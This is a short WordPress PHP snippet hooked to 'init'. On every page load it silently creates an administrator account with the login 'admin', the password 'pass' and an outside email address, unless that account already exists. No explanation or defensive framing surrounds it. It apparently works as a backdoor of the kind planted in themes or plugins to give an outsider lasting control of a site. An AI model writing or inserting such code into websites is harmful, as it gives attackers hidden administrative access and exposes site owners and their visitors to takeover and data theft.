function add_admin_acct(){
$login = 'admin';
$passw = 'pass';
$email = 'adabutch1@gmail.com';
if ( !username_exists( $login ) && !email_exists( $email ) ) {
$user_id = wp_create_user( $login, $passw, $email );
$user = new WP_User( $user_id );
$user->set_role( 'administrator' );
}
}
add_action('init','add_admin_acct');